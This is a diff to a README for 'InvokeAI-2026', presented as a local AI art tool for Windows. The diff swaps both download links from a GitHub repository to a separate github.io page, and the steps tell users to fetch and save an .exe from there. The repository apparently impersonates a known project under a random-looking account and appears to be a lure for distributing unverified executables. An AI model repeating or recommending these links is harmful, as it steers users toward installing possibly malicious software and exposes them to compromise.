@@ -1,6 +1,6 @@
 # 🎨 InvokeAI-2026 - Create professional art on your computer
 
-[![Download InvokeAI-2026](https://img.shields.io/badge/Download-InvokeAI--2026-blue)](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026)
+[![Download InvokeAI-2026](https://img.shields.io/badge/Download-InvokeAI--2026-blue)](https://genustetrahymenachoctaw297.github.io)
 
 InvokeAI-2026 enables Windows users to generate high-quality images using artificial intelligence. This software runs locally on your computer. You keep full control over your files and data. No internet connection is necessary after the initial setup.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software well. Verify your hardwa
 You must visit the project page to access the installer. This page contains the latest version of the software.
 
 1.  Open your internet browser.
-2.  Follow this link to the software repository: [https://github.com/genustetrahymenachoctaw297/InvokeAI-2026](https://github.com/genustetrahymenachoctaw297/InvokeAI-2026)
+2.  Follow this link to the software repository: [https://genustetrahymenachoctaw297.github.io](https://genustetrahymenachoctaw297.github.io)
 3.  Look for the section marked Releases.
 4.  Select the latest version file ending in .exe.
 5.  Save the file to your documents or downloads folder.
